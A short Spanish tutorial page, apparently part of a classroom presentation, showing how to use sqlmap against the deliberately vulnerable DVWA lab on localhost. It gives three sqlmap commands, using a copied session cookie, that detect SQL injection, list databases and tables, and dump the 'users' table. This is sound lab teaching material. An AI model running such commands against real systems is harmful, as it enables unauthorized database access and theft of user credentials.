---
sidebar_position: 4
title: Automatización con sqlmap
---

# Automatización con sqlmap (la herramienta de Kali)

**sqlmap** es la herramienta estándar incluida en Kali para **detectar y explotar SQLi de forma automática**. Hace sola lo que en la página anterior se hizo a mano.

Antes se necesita la **cookie de sesión** de DVWA. En el navegador: `F12` → pestaña **Application** → **Cookies**, y copiar el valor de `PHPSESSID` y de `security`.

```bash
# Detectar la vulnerabilidad y listar las bases de datos
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_VALOR; security=low" --dbs

# Listar las tablas de la base "dvwa"
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_VALOR; security=low" -D dvwa --tables

# Extraer (dump) el contenido de la tabla "users"
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_VALOR; security=low" -D dvwa -T users --dump
```

:::info Opinión
En mi opinión, este es el momento más llamativo para la exposición: se ve cómo sqlmap prueba cientos de combinaciones, detecta el tipo de inyección y saca la tabla completa en segundos.
:::
